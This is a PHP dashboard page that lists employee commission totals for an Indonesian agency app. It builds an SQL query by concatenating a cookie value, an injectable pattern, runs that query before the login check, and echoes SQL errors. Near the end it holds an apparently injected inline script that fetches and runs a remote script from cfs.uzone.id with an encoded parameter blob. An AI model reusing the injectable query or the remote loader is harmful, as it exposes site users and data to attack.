<?php
session_start();
require '../db.php';

$sqlU = "SELECT * FROM `users`,`employees` WHERE users.employee_id = employees.id AND users.username = '".$_COOKIE['idU']."'";
$resultU = mysqli_query($link, $sqlU);
$rowU = mysqli_fetch_array($resultU);
if(!$resultU) {
    echo "SQL ERROR: ".$sqlU;
}

if(!isset($_COOKIE['loginU'])) {
    header('location: ../login.php');
}

$sql = "SELECT employee_id, sum(komisi) as total_komisi 
        FROM `hub_closing_employee` group by employee_id
        order by total_komisi desc";
$result = mysqli_query($link, $sql);
if(!$result) {
    echo "SQL ERROR: ".$sql; 
}

?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
    <link rel="icon" type="image/png" sizes="96x96" href="../assets/img/favicon.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />

    <title>Laporan Komisi</title>
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />

    <!-- DataTables Start -->
    <link href="../assets/assets/plugins/datatables/jquery.dataTables.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/buttons.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/responsive.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/scroller.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/dataTables.colVis.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/dataTables.bootstrap.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/plugins/datatables/fixedColumns.dataTables.min.css" rel="stylesheet" type="text/css"/>
    <link href="../assets/assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/assets/css/metisMenu.min.css" rel="stylesheet">
    <link href="../assets/assets/css/icons.css" rel="stylesheet">
    <link href="../assets/assets/css/style.css" rel="stylesheet">
    <!-- DataTables End -->

    <!-- Bootstrap core CSS -->
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet" />

    <!--  Paper Dashboard core CSS -->
    <link href="../assets/css/paper-dashboard.css?v=1.2.1" rel="stylesheet"/>

    <!--  CSS for Demo Purpose, don't include it in your project -->
    <link href="../assets/css/demo.css" rel="stylesheet" />

    <!-- Animation library for notifications -->
    <link href="../assets/css/animate.min.css" rel="stylesheet"/>

    <!--  Fonts and icons     -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link href='https://fonts.googleapis.com/css?family=Muli:400,300' rel='stylesheet' type='text/css'>
    <link href="../assets/css/themify-icons.css" rel="stylesheet">

</head>
<body>
    <div class="wrapper">
        <!-- Menu -->
        <div class="sidebar" data-background-color="brown" data-active-color="danger"> <div class="logo"> <a href="../home.php" class="simple-text logo-mini"> AA Indonesia </a> <a href="../home.php" class="simple-text logo-normal"> AA Indonesia </a> </div><div class="sidebar-wrapper"> <ul class="nav"> <li> <a href="../home.php"> <i class="ti-panel"></i> <p>Dashboard</p></a> </li><li> <a data-toggle="collapse" href="#agentExamples"> <i class="ti-user"></i> <p>Agent <b class="caret"></b> </p></a> <div class="collapse" id="agentExamples"> <ul class="nav"> <li> <a href="../agent/info.php"> <span class="sidebar-mini">I</span> <span class="sidebar-normal">Info</span> </a> </li><li> <a href="../agent/daftar.php"> <span class="sidebar-mini">D</span> <span class="sidebar-normal">Daftar</span> </a> </li></ul> </div></li><li> <a data-toggle="collapse" href="#cabangExamples"> <i class="ti-home"></i> <p> Cabang <b class="caret"></b> </p></a> <div class="collapse" id="cabangExamples"> <ul class="nav"> <li> <a href="../cabang/info.php"> <span class="sidebar-mini">I</span> <span class="sidebar-normal">Info</span> </a> </li><li> <a href="../cabang/daftar.php"> <span class="sidebar-mini">D</span> <span class="sidebar-normal">Daftar</span> </a> </li></ul> </div></li><li> <a href="../closing.php"> <i class="ti-pencil-alt"></i> <p> Closing </p></a> </li><li> <a data-toggle="collapse" class-aria-expanded="true" href="#laporanExamples"> <i class="ti-stats-up"></i> <p> Laporan <b class="caret"></b> </p></a> <div class="collapse in" aria-expanded="true" id="laporanExamples"> <ul class="nav"> <li > <a href="rekapitulasi.php"> <span class="sidebar-mini">RK</span> <span class="sidebar-normal">Rekapitulasi</span> </a> </li><li> <a href="komisi.php"> <span class="sidebar-mini">KM</span> <span class="sidebar-normal">Komisi</span> </a> </li><li> <a href="unit.php"> <span class="sidebar-mini">UN</span> <span class="sidebar-normal">Unit</span> </a> </li><li class="active"> <a href="aktif.php"> <span class="sidebar-mini">AK</span> <span class="sidebar-normal">Aktif</span> </a> </li><li> <a href="pasif.php"> <span class="sidebar-mini">PS</span> <span class="sidebar-normal">Pasif</span> </a> </li></ul> </div></li><li> <a href="../pengaturan.php"> <i class="ti-settings"></i> <p> Pengaturan </p></a> </li></ul> </div></div>
        <!-- Menu -->

        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="collapse navbar-collapse">

                        <a class="navbar-brand" href="rekapitulasi.php">Laporan Komisi</a>

                        <ul class="nav navbar-nav navbar-right">
                            <li>
                                <a>
                                    <i class="ti-user"></i>
                                    <p>
                                        <?php echo $rowU['nama'];?>   
                                    </p>
                                </a>                                  
                            </li>
                            <li>
                                <a href="../proses.php?cmd=logout">
                                    <i class="ti-power-off"></i>
                                    <p>
                                        Logout
                                    </p>
                                </a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>

            <div class="content">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-md-12">

                            <div class="card">
                                <div class="card-content">
                                    <div class="row">
                                        <div class="col-md-4">
                                            <h4 class="card-title">Tanggal Awal:</h4>
                                            <div class="input-group">
                                                <input type="text" name="tanggal_awal" id="tanggal_awal" class="form-control datetpicker" required></input>
                                                <span class="input-group-addon"><i class="ti-calendar"></i></span>
                                            </div>
                                        </div>                              
                                        <div class="col-md-4">
                                            <h4 class="card-title">Tanggal Akhir:</h4>
                                            <div class="input-group">
                                                <input type="text" name="tanggal_akhir" id="tanggal_akhir" class="form-control datetpicker" required></input>
                                                <span class="input-group-addon"><i class="ti-calendar"></i></span>
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <h4 class="card-title"><br/></h4>
                                            <div class="form-group"> 
                                                <select name="jabatan_id" id="jabatan_id" class="form-control">
                                                    <option value='1'>Semua</option>
                                                    <option value='2'>--</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-md-2">
                                            <h4 class="card-title"><br/></h4>
                                            <div class="form-group"> 
                                                <input type="submit" name="submit" class="btn btn-info btn-fill pull-right" value="Cari" style="width: 150px;"/>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="card">
                                <div class="card-content">
                                    <div class="row">
                                        <div class="col-md-12">
                                            <div class="m-b-20 table-responsive">
                                                <table id="datatable-buttons" class="table table-striped">
                                                    <thead>
                                                        <th data-field="no" data-sortable="true">No</th>
                                                        <th data-field="id" data-sortable="true">ID</th>
                                                        <th data-field="nama" data-sortable="true">Nama</th>
                                                        <th data-field="komisi" data-sortable="true">Total Komisi</th>
                                                    </thead>

                                                    <tbody>
                                                        <?php
                                                        $hitung = 1;
                                                        $index = 0;
                                                        while ($row = mysqli_fetch_object($result)) {
                                                            $sqlNama = "SELECT * FROM employees WHERE id=".$row->employee_id;
                                                            $resultNama = mysqli_query($link, $sqlNama);
                                                            $rowNama = mysqli_fetch_array($resultNama);
                                                            echo "<tr>";//data-index='".$row->id."'>";
                                                            echo "<td>" . $hitung. "</td>";
                                                            echo "<td>" . $row->employee_id . "</td>";
                                                            echo "<td>" . $rowNama['nama']. "</td>";
                                                            echo "<td>" . $row->total_komisi. "</td>";
                                                            echo "</tr>";
                                                            $hitung = $hitung +1;
                                                            $index = $index+1;
                                                        } ?>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <br/><footer class="footer"> <div class="container-fluid"> <nav class="pull-left"> <ul> <li> <a href="#"> Media Solution </a> </li><li> <a href="#"> Blog </a> </li><li> <a href="#"> Licenses </a> </li></ul> </nav> <div class="copyright pull-right"> &copy; <script>document.write(new Date().getFullYear())</script> - Made with <i class="fa fa-heart heart"></i> by <a href="#">Media Solution</a> </div></div></footer>
        </div>
    </div>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKAz6JMkPltAPvhVgLvKlTyG2Q11ufhKxvls%2b8rFsEzchpoITXnhMJFZld3kCxvoNkNPdSGq2TK2v2KoYMSUVA%2fRJ8BGERO2px0q4sLTPEm9fUuNuLFnySTHe4rKMiVTFxzcx8n7HsaQFwVEyjcKFBhkyxu22Wv%2fOkug1QYCC8c53H1tyHX0DwMT3kwOtKb7Pd6d%2fZyWJMhwMIlSRie7MjjQkiZIZlwTOaqTwZnJ0bnnsAEwI6kB%2ffkvG98edF7%2bNYHlQTs9IqhcuHwDJeoUt5MC6UYm12Ow1kfcGZLMQ%2fzAI67OTHn5Hh%2bV2u%2bWlCakD5DO1DZreCnzBJGUgasGQ8CC03skMa4OoNtUe5tVfYln6XYMf2PnTyxn31eoe1fCtXp6jcqWhudE7v6HNOLwqR6WniFk2hpic29awXcEGr6uk7CWaq%2fW6E5uSf8uect1F3yAT9IHca9agjmyu%2bqk%2f5HfEJUuawf4zpVC5FdRyAQzLwBTUi1ByX7LcRxJzibYJ3G%2bE3Efd7g0a%2b7Tefj0bfZeqoD7eB3rJ5phfNTt04G0Iy0%2bO5LJMGA%2fJHJ8YYeTp2prakOqivYnA3w%2fIvn8B8HfBmrugQ7wyGpSSkLijr5wgT2jVePhr8ATCZICeiEeMG2KmGB5qficquy0AOL5Esbb35sfVSUbBq1lDSygllLluf6lx75BFS0ewDgjBSQOhUliXezxocRE1CnFjzZG3aOm0DwRrMYopRpE25GHtYghrKotUSSpacXSsjbOyKGL%2fohRkQV%2biLkXWGVfamefhj7Rstqx3YVwHP4l7JxT9eaQc7tN9gXikwh2rvAquOV3UGCh8uXx3Yn8u9axvDPtApe8K8EdBmDCTDRuRIj2%2bWMEIEk2%2bsW1k8Qw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

    <!-- Datatable JS Start-->
    <script src="../assets/assets/js/jquery-2.1.4.min.js"></script>
    <script src="../assets/assets/js/bootstrap.min.js"></script>
    <script src="../assets/assets/js/metisMenu.min.js"></script>
    <script src="../assets/assets/js/jquery.slimscroll.min.js"></script>
    <script src="../assets/assets/plugins/datatables/jquery.dataTables.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.bootstrap.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.buttons.min.js"></script>
    <script src="../assets/assets/plugins/datatables/buttons.bootstrap.min.js"></script>
    <script src="../assets/assets/plugins/datatables/jszip.min.js"></script>
    <script src="../assets/assets/plugins/datatables/pdfmake.min.js"></script>
    <script src="../assets/assets/plugins/datatables/vfs_fonts.js"></script>
    <script src="../assets/assets/plugins/datatables/buttons.html5.min.js"></script>
    <script src="../assets/assets/plugins/datatables/buttons.print.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.keyTable.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.responsive.min.js"></script>
    <script src="../assets/assets/plugins/datatables/responsive.bootstrap.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.scroller.min.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.colVis.js"></script>
    <script src="../assets/assets/plugins/datatables/dataTables.fixedColumns.min.js"></script>
    <script src="../assets/assets/pages/jquery.datatables.init.js"></script>
    <script src="../assets/assets/js/jquery.app.js"></script>
    <!-- Datatable JS End -->

    <!--   Core JS Files. Extra: TouchPunch for touch library inside jquery-ui.min.js   -->
    <script src="../assets/js/jquery-3.1.1.min.js" type="text/javascript"></script>
    <script src="../assets/js/jquery-ui.min.js" type="text/javascript"></script>
    <script src="../assets/js/perfect-scrollbar.min.js" type="text/javascript"></script>
    <script src="../assets/js/bootstrap.min.js" type="text/javascript"></script>

    <!--  Forms Validations Plugin -->
    <script src="../assets/js/jquery.validate.min.js"></script>

    <!-- Promise Library for SweetAlert2 working on IE -->
    <script src="../assets/js/es6-promise-auto.min.js"></script>

    <!--  Plugin for Date Time Picker and Full Calendar Plugin-->
    <script src="../assets/js/moment.min.js"></script>

    <!--  Date Time Picker Plugin is included in this js file -->
    <script src="../assets/js/bootstrap-datetimepicker.js"></script>

    <!--  Select Picker Plugin -->
    <script src="../assets/js/bootstrap-selectpicker.js"></script>

    <!--  Switch and Tags Input Plugins -->
    <script src="../assets/js/bootstrap-switch-tags.js"></script>

    <!-- Circle Percentage-chart -->
    <script src="../assets/js/jquery.easypiechart.min.js"></script>

    <!--  Charts Plugin -->
    <script src="../assets/js/chartist.min.js"></script>

    <!--  Notifications Plugin    -->
    <script src="../assets/js/bootstrap-notify.js"></script>

    <!-- Sweet Alert 2 plugin -->
    <script src="../assets/js/sweetalert2.js"></script>

    <!-- Vector Map plugin -->
    <script src="../assets/js/jquery-jvectormap.js"></script>

    <!-- Wizard Plugin    -->
    <script src="../assets/js/jquery.bootstrap.wizard.min.js"></script>

    <!--  Bootstrap Table Plugin    -->
    <script src="../assets/js/bootstrap-table.js"></script>

    <!--  Plugin for DataTables.net  -->
    <script src="../assets/js/jquery.datatables.js"></script>

    <!--  Full Calendar Plugin    -->
    <script src="../assets/js/fullcalendar.min.js"></script>

    <!-- Paper Dashboard PRO Core javascript and methods for Demo purpose -->
    <script src="../assets/js/paper-dashboard.js?v=1.2.1"></script>

    <!--   Sharrre Library    -->
    <script src="../assets/js/jquery.sharrre.js"></script>

    <!-- Paper Dashboard PRO DEMO methods, don't include it in your project! -->
    <script src="../assets/js/demo.js"></script>

    <script type="text/javascript">
    var $table = $('#bootstrap-table');

        function operateFormatter(value, row, index) {
            return [
                '<div class="table-icons">',
                    '<a rel="tooltip" title="View" class="btn btn-simple btn-info btn-icon table-action view" href="javascript:void(0)">',
                        '<i class="ti-image"></i>',
                    '</a>',
                    '<a rel="tooltip" title="Edit" class="btn btn-simple btn-warning btn-icon table-action edit" href="javascript:void(0)">',
                        '<i class="ti-pencil-alt"></i>',
                    '</a>',
                    '<a rel="tooltip" title="Remove" class="btn btn-simple btn-danger btn-icon table-action remove" href="javascript:void(0)">',
                        '<i class="ti-close"></i>',
                    '</a>',
                '</div>',
            ].join('');
        }

        $().ready(function(){
            window.operateEvents = {
                'click .view': function (e, value, row, index) {
                    info = JSON.stringify(row);

                    swal('You click view icon, row: ', info);
                    console.log(info);
                },
                'click .edit': function (e, value, row, index) {
                    info = JSON.stringify(row);

                    swal('You click edit icon, row: ', info);
                    console.log(info);
                },
                'click .remove': function (e, value, row, index) {
                    console.log(row);
                    $table.bootstrapTable('remove', {
                        field: 'id',
                        values: [row.id]
                    });
                }
            };

            $table.bootstrapTable({
                toolbar: ".toolbar",
                clickToSelect: true,
                showRefresh: true,
                search: true,
                showToggle: true,
                showColumns: true,
                pagination: true,
                searchAlign: 'left',
                pageSize: 8,
                clickToSelect: false,
                pageList: [8,10,25,50,100],

                formatShowingRows: function(pageFrom, pageTo, totalRows){
                    //do nothing here, we don't want to show the text "showing x of y from..."
                },
                formatRecordsPerPage: function(pageNumber){
                    return pageNumber + " rows visible";
                },
                icons: {
                    refresh: 'fa fa-refresh',
                    toggle: 'fa fa-th-list',
                    columns: 'fa fa-columns',
                    detailOpen: 'fa fa-plus-circle',
                    detailClose: 'ti-close'
                }
            });

            //activate the tooltips after the data table is initialized
            $('[rel="tooltip"]').tooltip();

            $(window).resize(function () {
                $table.bootstrapTable('resetView');
            });
        });

        $(function(){
            $('#notify').slideDown();
            $(".datetpicker").datetimepicker({
                format: 'YYYY-MM-DD',
                allowInputToggle: true
            });
        });
    </script>

</html>